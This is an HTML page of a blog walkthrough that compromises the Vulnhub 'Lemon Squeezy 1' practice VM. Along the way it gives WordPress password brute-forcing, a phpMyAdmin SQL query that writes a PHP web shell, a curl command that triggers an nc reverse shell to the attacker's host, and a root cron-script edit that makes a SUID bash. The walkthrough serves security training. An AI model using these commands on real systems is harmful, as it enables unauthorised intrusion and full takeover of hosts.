<!doctype html><html lang=en><head><title>Vulnhub: Lemon Squeezy 1 ::</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/lemonsqueezy1/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.ikuamike.io/img/lemonsqueezy1/lemon.png"><meta name=twitter:title content="Vulnhub: Lemon Squeezy 1"><meta name=twitter:description content><meta name=twitter:site content="@ikuamike"><link rel=stylesheet href=https://blog.ikuamike.io/styles.css><link rel=stylesheet href=https://blog.ikuamike.io/css/style.css><link rel="shortcut icon" href=https://blog.ikuamike.io/img/theme-colors/green.png><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/theme-colors/green.png><meta name=twitter:card content="summary_large_image"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Vulnhub: Lemon Squeezy 1"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/lemonsqueezy1/"><meta property="og:site_name" content><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2021-04-13 00:00:00 +0000 UTC"></head><div id=particles-js></div><body class=green><div class="container center headings--one-size" style=background:#1f222a;z-index:1><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/lemonsqueezy1/>Vulnhub: Lemon Squeezy 1</a></h1><div class=post-meta><time class=post-date>2021-04-13 ::</time></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/beginner/>Beginner</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/vulnhub/>Vulnhub</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/oscp-prep/>OSCP Prep</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/directory-bruteforce/>Directory Bruteforce</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/ffuf/>ffuf</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/wordpress/>WordPress</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/wpscan/>WPScan</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/phpmyadmin/>PHPMyAdmin</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/cron/>Cron</a>&nbsp;</span><div class=post-content><div><img src=/img/lemonsqueezy1/lemon.png class=center style=border-radius:8px><table><thead><tr><th>Difficulty</th><th>Release Date</th><th>Author</th></tr></thead><tbody><tr><td>Beginner</td><td>26 Apr 2020</td><td>James Hay</td></tr></tbody></table><h1 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a></h1><p>For this box we only get one port running a web server and we discover wordpress and phpmyadmin by directory bruteforcing.
On the wordpress application we bruteforce credentials of the users discovered and then discover more credentials stored
in a draft post. With this new credentials we access phpmyadmin and write to a file using an sql query. This serves
as our initial foothold and we then escalate privileges by abusing a cron job running as root that executes a world writeable
script.</p><h1 id=reconnaissance>Reconnaissance<a href=#reconnaissance class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Nmap</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.191.134
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00014s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.25 <span style=color:#f92672>((</span>Debian<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.25 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Apache2 Debian Default Page: It works
</span></span><span style=display:flex><span>MAC Address: 00:0C:29:FF:26:DE <span style=color:#f92672>(</span>VMware<span style=color:#f92672>)</span>
</span></span></code></pre></div><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=80-http>80 (HTTP)<a href=#80-http class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Visiting this page on the browser only serves the apache default page, confirming what nmap found in title.</p><p>After performing a directory bruteforce using ffuf we get the following directories:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ffuf -ic -c -u <span style=color:#e6db74>&#39;http://192.168.191.134/FUZZ&#39;</span> -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t <span style=color:#ae81ff>50</span>
</span></span></code></pre></div><img src=/img/lemonsqueezy1/lemon-1.png class=center style=border-radius:8px><p>Checking the /wordpress directory, we see a basic wordpress site with not much information.</p><img src=/img/lemonsqueezy1/lemon-2.png class=center style=border-radius:8px><p>Performing enumeration using wpscan, the only interesting information gathered is the usernames.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
</span></span></code></pre></div><img src=/img/lemonsqueezy1/lemon-3.png class=center style=border-radius:8px><p>Bruteforcing the credentials for each user, we discover the password of the orange user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
</span></span></code></pre></div><img src=/img/lemonsqueezy1/lemon-4.png class=center style=border-radius:8px><p>After logging into wordpress with the discovered credentials <strong>orange:ginger</strong>, we find another password in drafts.</p><img src=/img/lemonsqueezy1/lemon-5.png class=center style=border-radius:8px><p>With this password, we are able to login to phpmyadmin as the orange user.</p><img src=/img/lemonsqueezy1/lemon-6.png class=center style=border-radius:8px><p>Successful login:</p><img src=/img/lemonsqueezy1/lemon-7.png class=center style=border-radius:8px><p>By logging in we can abuse this access by writing a file to disk that contains php by using an sql statement.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> <span style=color:#e6db74>&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;</span> <span style=color:#66d9ef>into</span> outfile <span style=color:#e6db74>&#34;/var/www/html/wordpress/shell.php&#34;</span> 
</span></span></code></pre></div><img src=/img/lemonsqueezy1/lemon-8.png class=center style=border-radius:8px><p>We can then verify that we have successful command execution, by running the whoami command.</p><img src=/img/lemonsqueezy1/lemon-9.png class=center style=border-radius:8px><h1 id=shell-as-www-data>Shell as www-data<a href=#shell-as-www-data class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Running the below curl command we are able to get a reverse shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>curl <span style=color:#e6db74>&#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&#34;</span>
</span></span></code></pre></div><img src=/img/lemonsqueezy1/lemon-10.png class=center style=border-radius:8px><p>After performing some manual local enumeration, we discover a cron job running as root.</p><img src=/img/lemonsqueezy1/lemon-11.png class=center style=border-radius:8px><p>The script being executed in the cron job is world writeable and the www-data user can write to it.</p><img src=/img/lemonsqueezy1/lemon-12.png class=center style=border-radius:8px><h1 id=shell-as-root>Shell as root<a href=#shell-as-root class=hanchor arialabel=Anchor>&#8983;</a></h1><p>After changing the script to the below command we can create a bash binary with suid permissions.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>cp /bin/bash /suidbash
</span></span><span style=display:flex><span>chmod u+s /suidbash
</span></span></code></pre></div><img src=/img/lemonsqueezy1/lemon-13.png class=center style=border-radius:8px><p>Once the cron is executed we get the binary and can escalate to root shell and read root.txt.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>./suidbash -p
</span></span></code></pre></div><img src=/img/lemonsqueezy1/lemon-14.png class=center style=border-radius:8px><h1 id=extras>Extras<a href=#extras class=hanchor arialabel=Anchor>&#8983;</a></h1><ul><li>It seems I forgot user.txt and it is in /var/www.</li></ul><img src=/img/lemonsqueezy1/lemon-15.png class=center style=border-radius:8px><ul><li>We could write to the wordpress folder from phpmyadmin because it was world-writeable.</li></ul><img src=/img/lemonsqueezy1/lemon-16.png class=center style=border-radius:8px></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://blog.ikuamike.io/posts/2021/misdirection1/><span class=button__icon>←</span>
<span class=button__text>Vulnub: Misdirection 1</span></a></span>
<span class="button next"><a href=https://blog.ikuamike.io/posts/2021/healthcare1/><span class=button__text>Vulnhub: Healthcare 1</span>
<span class=button__icon>→</span></a></span></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2023 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div><script src=/js/vanilla-back-to-top.min.js></script>
<script>addBackToTop({diameter:40,backgroundColor:"rgb(120, 226, 160)",textColor:"#1F222A",cornerOffset:30})</script><script src=/js/particles.min.js></script>
<script>particlesJS("particles-js",{particles:{number:{value:80,density:{enable:!0,value_area:1e3}},color:{value:"#ffffff"},shape:{type:"circle",stroke:{width:0,color:"#000000"}},opacity:{value:.5,random:!1,anim:{enable:!1,speed:1,opacity_min:.1,sync:!1}},size:{value:2,random:!0,anim:{enable:!1,speed:4,size_min:.1,sync:!1}},line_linked:{enable:!0,distance:150,color:"#ffffff",opacity:.3,width:1},move:{enable:!0,speed:.5,direction:"none",random:!0,straight:!1,out_mode:"out",bounce:!1,attract:{enable:!1,rotateX:600,rotateY:1200}}},retina_detect:!0})</script></body></html>